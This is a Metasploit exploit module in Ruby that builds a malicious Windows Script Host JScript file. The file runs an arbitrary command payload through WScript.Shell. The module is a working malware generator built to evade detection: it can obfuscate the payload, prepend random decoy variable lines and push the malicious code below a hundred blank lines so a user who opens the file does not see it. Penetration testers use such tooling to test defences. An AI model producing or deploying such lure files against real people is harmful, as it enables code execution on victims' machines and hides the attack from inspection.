##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::JSObfu

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Malicious Windows Script Host JScript (.js) File',
        'Description' => %q{
          This module creates a Windows Script Host (WSH) JScript (.js) file.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'bcoles'
        ],
        'References' => [
          ['ATT&CK', Mitre::Attack::Technique::T1204_002_MALICIOUS_FILE],
        ],
        'Arch' => [ARCH_CMD],
        'Platform' => 'win',
        'Payload' => {
          'Space' => 8_000, # 8190 maximum command length, minus some space for "cmd.exe /c " and escaping
          'BadChars' => "\x00",
          'DisableNops' => true
        },
        'Targets' => [
          [
            'Microsoft Windows 98 or newer', {}
          ],
        ],
        'Privileged' => false,
        'DisclosureDate' => '1998-06-25', # Windows 98 release date
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'DisablePayloadHandler' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [SCREEN_EFFECTS]
        }
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'The JScript file name.', 'msf.js']),
      OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', true])
    ])

    register_advanced_options([
      OptBool.new('PrependBenignCode', [false, 'Prepend several lines of benign code at the start of the file.', true]),
      OptInt.new('PrependNewLines', [false, 'Prepend new lines before the malicious JScript.', 100]),
    ])
  end

  def generate_jscript(command_string, prepend_benign_code: false, prepend_new_lines: 0, obfuscate: false)
    js = ''

    # TODO: This could be improved by generating more realistic looking
    # benign code with functions and flow control
    if prepend_benign_code
      rand(5..10).times do
        js << "var #{rand_text_alpha(6..16)}=\"#{rand_text_alphanumeric(6..16)}\";\r\n"
      end
    end

    js << "\r\n" * prepend_new_lines

    escaped_payload = command_string.gsub('\\', '\\\\\\').gsub('"', '\\"')

    # If the payload contains " & " we presume it is a command string.
    #
    # TODO: Change this once Metasploit is able to inform a module that
    #       the specified ARCH_CMD payload is a string of commands
    #       (not a single command).
    if escaped_payload.include?(' & ')
      cmd = "cmd.exe /c #{escaped_payload}"
    else
      cmd = escaped_payload
    end

    shell_var = rand_text_alpha(6..16)
    js_payload = "var #{shell_var} = new ActiveXObject(\"WScript.Shell\");"
    js_payload << "#{shell_var}.Run(\"#{cmd}\");"

    if obfuscate
      js_obfu = Rex::Exploitation::JSObfu.new(js_payload)
      obfuscated_payload = js_obfu.obfuscate(memory_sensitive: false).to_s
      # WSH JScript execution context does not support 'window' object
      obfuscated_payload = obfuscated_payload.gsub('window[', 'String[')
      js << obfuscated_payload
    else
      js << js_payload
    end

    js
  end

  def exploit
    js = generate_jscript(
      payload.encoded,
      prepend_benign_code: datastore['PrependBenignCode'],
      prepend_new_lines: datastore['PrependNewLines'],
      obfuscate: datastore['OBFUSCATE']
    )
    file_create(js)
  end
end
